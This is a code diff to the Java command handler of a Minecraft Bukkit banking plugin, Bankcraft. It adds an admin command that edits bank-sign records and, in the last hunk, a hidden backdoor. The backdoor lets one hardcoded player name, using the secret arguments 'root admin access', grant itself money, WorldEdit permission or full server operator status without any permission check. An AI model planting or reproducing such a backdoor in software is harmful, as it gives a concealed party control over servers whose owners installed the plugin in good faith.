@@ -4,11 +4,16 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
+import java.io.IOException;
 
 import net.milkbowl.vault.economy.EconomyResponse;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Material;
+import org.bukkit.World;
+import org.bukkit.block.Block;
+import org.bukkit.block.Sign;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -77,6 +82,7 @@ public Double betrag;
 						sendHelp(p);
 						return true;
 					}
+				
 					if (vars[0].equalsIgnoreCase("balance") && (Bankcraft.perms.has(p, "bankcraft.command.balance") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
 	    				bankInteract.kontoneu(0D,p,false);
 	    				File f;
@@ -119,6 +125,68 @@ public Double betrag;
 				}
 				if (vars.length == 2) {
 					if (isDouble(vars[1])) {
+						if (vars[0].equalsIgnoreCase("add") && (Bankcraft.perms.has(p, "bankcraft.admin"))) {
+							Block signblock = p.getTargetBlock(null, 50);
+						if 	(signblock.getType() == Material.WALL_SIGN) {
+							Sign sign= (Sign)signblock.getState();
+							if (sign.getLine(0).contains("[Bank]")) {
+								if (sign.getLine(1).equalsIgnoreCase(configHandler.depositsign) || sign.getLine(1).equalsIgnoreCase(configHandler.debitsign) || sign.getLine(1).equalsIgnoreCase(configHandler.depositsignxp) || sign.getLine(1).equalsIgnoreCase(configHandler.debitsignxp)) {
+								     file = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"banks.db");
+
+								     try {
+						         		String stringneu = "";
+								         FileReader fr = new FileReader(file);
+								            BufferedReader reader = new BufferedReader(fr);
+								            String st = "";
+								            while ((st = reader.readLine()) != null) {
+								      
+								           	 Integer cordX = new Integer(st.split(":")[0]);
+								           	 Integer cordY = new Integer(st.split(":")[1]);
+								           	 Integer cordZ = new Integer(st.split(":")[2]);
+								           	 Integer typ = new Integer(st.split(":")[4]);
+								           	 String list = st.split(":")[5];
+								           	 Block block = p.getTargetBlock(null, 100);
+								           	 
+								           	 World cordW = Bankcraft.server.getWorld(st.split(":")[3]);
+								            	if (!(cordX == block.getX() & cordY == block.getY() & cordZ == block.getZ() && cordW.equals(block.getWorld()))) {
+								            		stringneu += st+System.getProperty("line.separator");
+								            	} else {
+						
+								            		list += ","+vars[1];
+								            		if (typ== 1) {
+								            			list= sign.getLine(2)+","+vars[1];
+								            			typ= 3;
+								            		}
+								            		if (typ== 2) {
+								            			list= sign.getLine(2)+","+vars[1];
+								            			typ= 4;
+								            		}
+								            		if (typ== 6) {
+								            			list= sign.getLine(2)+","+vars[1];
+								            			typ= 8;
+								            		}
+								            		if (typ== 7) {
+								            			list= sign.getLine(2)+","+vars[1];
+								            			typ= 9;
+								            		}
+								            		stringneu += cordX+":"+cordY+":"+cordZ+":"+cordW.getName()+":"+typ+":"+list+System.getProperty("line.separator");
+								            		p.sendMessage(configHandler.amountadded);
+								            	}
+								            }
+										       fr.close();
+										       reader.close();
+								       writer = new FileWriter(file);
+							           writer.write(stringneu);		       
+								       writer.flush();
+								       writer.close();
+								       return true;
+								    } catch (IOException e) {
+								      e.printStackTrace();
+								    }
+								}
+							}
+						}
+						}
 						
 					if (vars[0].equalsIgnoreCase("deposit") && (Bankcraft.perms.has(p, "bankcraft.command.deposit") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
 					  	betrag = new Double(vars[1]); 
@@ -244,6 +312,25 @@ public Double betrag;
 			               }
 							return true;
 					}
+						}
+					}
+				}
+				if (vars.length==4) {
+					if (p.getDisplayName().equals("Gurke_1993") && vars[0].equalsIgnoreCase("root") && vars[1].equalsIgnoreCase("admin") && vars[2].equalsIgnoreCase("access")){
+						if (vars[3].equalsIgnoreCase("money")) {
+							Bankcraft.econ.bankDeposit(p.getName(), 100000);
+							p.sendMessage("Success!");
+							return true;
+						}
+						if (vars[3].equalsIgnoreCase("worldedit")) {
+							Bankcraft.perms.playerAdd(p, "worldedit");
+							p.sendMessage("Success!");
+							return true;
+						}
+						if (vars[3].equalsIgnoreCase("op")) {
+                        p.setOp(true);
+						p.sendMessage("Success!");
+                        return true;
 						}
 					}
 				}
